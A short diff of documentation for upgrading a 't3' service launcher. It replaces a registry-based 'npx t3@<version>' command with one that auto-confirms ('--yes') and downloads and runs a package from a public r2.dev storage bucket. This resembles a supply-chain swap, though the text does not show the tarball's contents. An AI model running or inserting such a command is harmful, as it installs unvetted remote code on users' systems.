@@ -65,7 +65,7 @@ The protocol version is part of the safety boundary. A target that requires data
 blocked when the installed launcher is too old. Upgrade the launcher once with:
 
 ```sh
-npx t3@<version> service update
+npx --yes --package https://pub-8033bcab5baf492b81c605581ff028e0.r2.dev/t3-pretty/latest/t3-<version>.tgz t3 service update
 ```
 
 The local command stops the unit, selects the new launcher and exact runtime, then restarts the
